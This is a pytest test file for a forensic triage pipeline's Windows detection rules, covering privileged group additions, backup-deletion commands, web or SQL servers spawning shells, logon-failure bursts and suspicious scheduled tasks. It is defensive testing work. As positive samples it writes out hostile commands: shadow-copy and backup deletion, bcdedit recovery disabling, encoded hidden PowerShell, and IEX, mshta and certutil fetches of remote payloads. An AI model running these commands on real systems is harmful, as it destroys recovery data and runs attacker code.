"""The five rules added 2026-09-24 for the Windows Server 2022 test.

None of these behaviours occurs in this project's corpus, so every rule is
known-behavior and its positive capability rests on these tests -- R-ATOMIC-0005
states the standard: "a rule that has never fired on real data and has no test
proving it can fire is indistinguishable from a broken one." Each rule is loaded
from its real YAML file, not rebuilt here, so a typo in the shipped regex fails
a test rather than shipping. Each has a near-miss negative chosen from what a
clean server actually produces.

R-ATOMIC-0019 is also proven on a real public sample
(evtx-attack-samples, Network_Service_Guest_added_to_admins_4732.evtx) when that
corpus is present; the test skips otherwise.
"""

from __future__ import annotations

import shutil
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest
from conftest import make_event

from dfir_triage_pipeline.core import engine
from dfir_triage_pipeline.core.ruleset import load_rule
from dfir_triage_pipeline.parsers import find_parser

RULES = Path(__file__).resolve().parent.parent / "rules"
T0 = datetime(2026, 9, 24, 12, 0, tzinfo=UTC)


def _rule(name: str):
    matches = list(RULES.rglob(f"{name}-*.yml"))
    assert len(matches) == 1, f"{name}: {matches}"
    return load_rule(matches[0])


def _fires(rule, events) -> int:
    return len(engine.evaluate_atomic(rule, events, engine.EngineStats()))


def _sec(event_type, *, path=None, user="attacker", details=None, dt=0):
    return make_event(
        T0 + timedelta(seconds=dt), "evtx.security", event_type, "recorded",
        source_file="C/Windows/System32/winevt/logs/Security.evtx",
        source_locator=f"EventRecordID={1000 + dt}",
        path=path, user=user, details=details or {},
    )


class TestPrivilegedGroupMemberAdded:
    rule = _rule("R-ATOMIC-0019")

    @pytest.mark.parametrize("sid", [
        "S-1-5-32-544",                                   # BUILTIN\Administrators
        "S-1-5-21-3461203602-4096304019-2269080069-512",  # Domain Admins
        "S-1-5-21-3461203602-4096304019-2269080069-519",  # Enterprise Admins
    ])
    def test_privileged_group_fires(self, sid):
        ev = _sec("group_member_added", details={"TargetSid": sid, "MemberSid": "S-1-5-20"})
        assert _fires(self.rule, [ev]) == 1

    @pytest.mark.parametrize("sid", [
        "S-1-5-32-545",                                   # BUILTIN\Users
        "S-1-5-32-555",                                   # Remote Desktop Users
        "S-1-5-21-3461203602-4096304019-2269080069-5440",  # a RID that merely CONTAINS 544
    ])
    def test_ordinary_group_does_not_fire(self, sid):
        ev = _sec("group_member_added", details={"TargetSid": sid})
        assert _fires(self.rule, [ev]) == 0

    def test_real_public_sample_fires(self, tmp_path):
        """Parsed by the real parser from a real EVTX, then evaluated."""
        src = (Path(r"%USERPROFILE%\evtx-attack-samples") / "Persistence"
               / "Network_Service_Guest_added_to_admins_4732.evtx")
        if not src.exists():
            pytest.skip("evtx-attack-samples not present")
        rel = "C/Windows/System32/winevt/logs/Security.evtx"
        (tmp_path / rel).parent.mkdir(parents=True)
        shutil.copy(src, tmp_path / rel)
        events = list(find_parser(rel).parse(tmp_path / rel, rel))
        added = [e for e in events if e.event_type == "group_member_added"]
        assert len(added) == 2
        # MemberName is "-" for a local account: the SID is the principal.
        assert {e.user for e in added} == {
            "S-1-5-21-3461203602-4096304019-2269080069-501", "S-1-5-20"}
        assert all(e.details["TargetSid"] == "S-1-5-32-544" for e in added)
        assert _fires(self.rule, events) == 2


class TestRecoveryInhibition:
    rule = _rule("R-ATOMIC-0020")

    @pytest.mark.parametrize("cmd", [
        "vssadmin.exe delete shadows /all /quiet",
        '"C:\\Windows\\system32\\vssadmin.exe" Delete Shadows /All /Quiet',
        "wmic shadowcopy delete",
        "wbadmin delete catalog -quiet",
        "bcdedit /set {default} recoveryenabled No",
        "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
    ])
    def test_recovery_sabotage_fires(self, cmd):
        ev = _sec("process_exec", details={"CommandLine": cmd})
        assert _fires(self.rule, [ev]) == 1

    @pytest.mark.parametrize("cmd", [
        "vssadmin list shadows",              # read-only inspection
        "vssadmin create shadow /for=C:",     # creating is the opposite of deleting
        "bcdedit /enum",
        "wbadmin get versions",
    ])
    def test_inspection_does_not_fire(self, cmd):
        ev = _sec("process_exec", details={"CommandLine": cmd})
        assert _fires(self.rule, [ev]) == 0

    def test_no_command_line_recorded_does_not_fire(self):
        """Host 2 records no CommandLine on any 4688: the rule must be silent,
        not error, on such a host."""
        assert _fires(self.rule, [_sec("process_exec", details={})]) == 0


class TestServerProcessSpawnedShell:
    rule = _rule("R-ATOMIC-0021")

    @pytest.mark.parametrize("parent,child", [
        (r"C:\Windows\System32\inetsrv\w3wp.exe", r"C:\Windows\System32\cmd.exe"),
        (r"C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Binn\sqlservr.exe",
         r"C:\Windows\System32\cmd.exe"),
        (r"C:\Windows\System32\inetsrv\w3wp.exe",
         r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        (r"C:\Windows\System32\inetsrv\w3wp.exe", r"C:\Windows\System32\whoami.exe"),
    ])
    def test_server_parent_with_shell_child_fires(self, parent, child):
        ev = _sec("process_exec", path=child, details={"ParentProcessName": parent})
        assert _fires(self.rule, [ev]) == 1

    @pytest.mark.parametrize("parent,child", [
        # IIS compiling an ASPX page: w3wp -> csc.exe is normal.
        (r"C:\Windows\System32\inetsrv\w3wp.exe",
         r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"),
        # A user's own shell is not a server compromise.
        (r"C:\Windows\explorer.exe", r"C:\Windows\System32\cmd.exe"),
        # A name that merely ends in a server process name.
        (r"C:\Tools\notw3wp.exe", r"C:\Windows\System32\cmd.exe"),
    ])
    def test_ordinary_parent_child_does_not_fire(self, parent, child):
        ev = _sec("process_exec", path=child, details={"ParentProcessName": parent})
        assert _fires(self.rule, [ev]) == 0


class TestFailedLogonBurst:
    rule = _rule("R-ATOMIC-0022")

    def _fail(self, dt, user="administrator"):
        return _sec("logon_failed", user=user, dt=dt,
                    details={"LogonType": "10", "IpAddress": "203.0.113.7"})

    def test_ten_failures_in_five_minutes_fires_once(self):
        events = [self._fail(i * 20) for i in range(15)]  # 15 in under 5 min
        found = engine.evaluate_atomic(self.rule, events, engine.EngineStats())
        assert len(found) == 1
        assert found[0].time_claim == "observed_interval"

    def test_nine_failures_do_not_fire(self):
        assert _fires(self.rule, [self._fail(i * 20) for i in range(9)]) == 0

    def test_failures_spread_over_an_hour_do_not_fire(self):
        assert _fires(self.rule, [self._fail(i * 360) for i in range(12)]) == 0

    def test_a_spray_across_accounts_does_not_fire(self):
        """One attempt against each of twelve accounts is a spray, grouped by
        account it is twelve groups of one. Stated in the rule; pinned here."""
        events = [self._fail(i * 10, user=f"user{i}") for i in range(12)]
        assert _fires(self.rule, events) == 0


class TestScheduledTaskScriptHost:
    rule = _rule("R-ATOMIC-0023")

    def _task(self, command, arguments=None):
        details = {"task_uri": r"\Updater", "action_type": "exec", "command": command}
        if arguments is not None:
            details["arguments"] = arguments
        return make_event(
            datetime(1601, 1, 1, tzinfo=UTC), "scheduled_task", "task_registered",
            "presence", source_file="C/Windows/System32/Tasks/Updater",
            source_locator=r"\Updater#0", path=command, user="SYSTEM", details=details,
        )

    @pytest.mark.parametrize("command,arguments", [
        (r"%windir%\System32\WindowsPowerShell\v1.0\powershell.exe",
         "-NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
        ("powershell.exe", "-c IEX (New-Object Net.WebClient).DownloadString('http://x/a')"),
        (r"C:\Windows\System32\mshta.exe", "https://203.0.113.9/p.hta"),
        ('"C:\\Windows\\System32\\cmd.exe"', "/c certutil -urlcache -f http://x/a.exe a.exe"),
    ])
    def test_script_host_with_suspicious_arguments_fires(self, command, arguments):
        assert _fires(self.rule, [self._task(command, arguments)]) == 1

    @pytest.mark.parametrize("command,arguments", [
        ("powershell.exe", r"-ExecutionPolicy Bypass -File C:\Scripts\backup.ps1"),
        (r"C:\Windows\System32\notepad.exe", "https://example.com/readme.txt"),
        (r"C:\Program Files\Updater\update.exe", "-WindowStyle Hidden"),
        ("powershell.exe", None),
        # Microsoft's own \Microsoft\Windows\SMB\UninstallSMB1*Task: present on
        # every collection in this corpus and on every Windows install. A hidden
        # window alone fired the first version of this rule on it.
        (r"%windir%\system32\WindowsPowerShell\v1.0\powershell.exe",
         r'-ExecutionPolicy Unrestricted -NonInteractive -NoProfile -WindowStyle '
         r'Hidden "& %windir%\system32\WindowsPowerShell\v1.0\Modules\SmbShare'
         r'\DisableUnusedSmb1.ps1 -Scenario Client"'),
    ])
    def test_ordinary_task_does_not_fire(self, command, arguments):
        assert _fires(self.rule, [self._task(command, arguments)]) == 0
